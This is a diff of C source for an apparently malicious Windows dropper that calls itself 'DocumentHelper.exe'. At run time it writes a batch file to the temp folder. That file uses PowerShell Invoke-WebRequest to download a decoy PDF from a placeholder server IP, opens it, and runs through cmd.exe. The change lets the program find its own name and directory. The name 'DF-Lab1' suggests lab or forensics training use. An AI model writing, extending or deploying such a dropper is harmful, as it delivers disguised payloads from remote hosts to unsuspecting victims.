@@ -5,12 +5,7 @@
 #include <stdio.h>
 #include <string.h>
 
-static const char BAT[] =
-"@echo off\r\n"
-"setlocal EnableExtensions\r\n"
-"set \"EXE_NAME=phoenix.exe\"\r\n"
-"set \"EXE_DIR=%CD%\"\r\n"
-"set \"SERVER_IP=@IP@\"\r\n"
+static const char BAT_BODY[] =
 "powershell -NoProfile -Command \"Invoke-WebRequest -Uri 'http://%SERVER_IP%/download/DF-Lab1.pdf' -OutFile '%EXE_DIR%\\DF-Lab1.pdf' -UseBasicParsing\"\r\n"
 "powershell -NoProfile -Command \"Start-Process -FilePath '%EXE_DIR%\\DF-Lab1.pdf'\"\r\n"
 "powershell -NoProfile -Command \"Start-Sleep -Seconds 15\"\r\n"
@@ -21,18 +16,48 @@ static const char BAT[] =
 "endlocal\r\n";
 
 int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR cmd, int show) {
+    char exeFullPath[MAX_PATH];
+    char exeDir[MAX_PATH];
+    char exeName[MAX_PATH];
+
+    strncpy(exeDir, "%CD%", sizeof(exeDir));
+    strncpy(exeName, "DocumentHelper.exe", sizeof(exeName));
+
+    if (GetModuleFileNameA(NULL, exeFullPath, MAX_PATH) > 0) {
+        char *lastSlash = strrchr(exeFullPath, '\\');
+        if (lastSlash) {
+            strncpy(exeName, lastSlash + 1, sizeof(exeName) - 1);
+            exeName[sizeof(exeName) - 1] = '\0';
+            *lastSlash = '\0';
+            strncpy(exeDir, exeFullPath, sizeof(exeDir) - 1);
+            exeDir[sizeof(exeDir) - 1] = '\0';
+        } else {
+            strncpy(exeName, exeFullPath, sizeof(exeName) - 1);
+            exeName[sizeof(exeName) - 1] = '\0';
+        }
+    }
+
     char tmp[MAX_PATH];
     if (GetTempPathA(MAX_PATH, tmp) == 0) return 1;
 
-    char batpath[MAX_PATH];
-    snprintf(batpath, MAX_PATH, "%sphx_%lu.bat", tmp, GetCurrentProcessId());
+    char batpath[MAX_PATH + 64];
+    snprintf(batpath, sizeof(batpath), "%sphx_%lu.bat", tmp, GetCurrentProcessId());
 
     FILE *f = fopen(batpath, "wb");
     if (!f) return 1;
-    fwrite(BAT, 1, sizeof(BAT) - 1, f);
+
+    fprintf(f,
+        "@echo off\r\n"
+        "setlocal EnableExtensions\r\n"
+        "set \"EXE_NAME=%s\"\r\n"
+        "set \"EXE_DIR=%s\"\r\n"
+        "set \"SERVER_IP=@IP@\"\r\n",
+        exeName, exeDir
+    );
+    fwrite(BAT_BODY, 1, sizeof(BAT_BODY) - 1, f);
     fclose(f);
 
-    char cmdline[MAX_PATH + 20];
+    char cmdline[sizeof(batpath) + 32];
     snprintf(cmdline, sizeof(cmdline), "cmd.exe /c \"%s\"", batpath);
 
     STARTUPINFOA si;
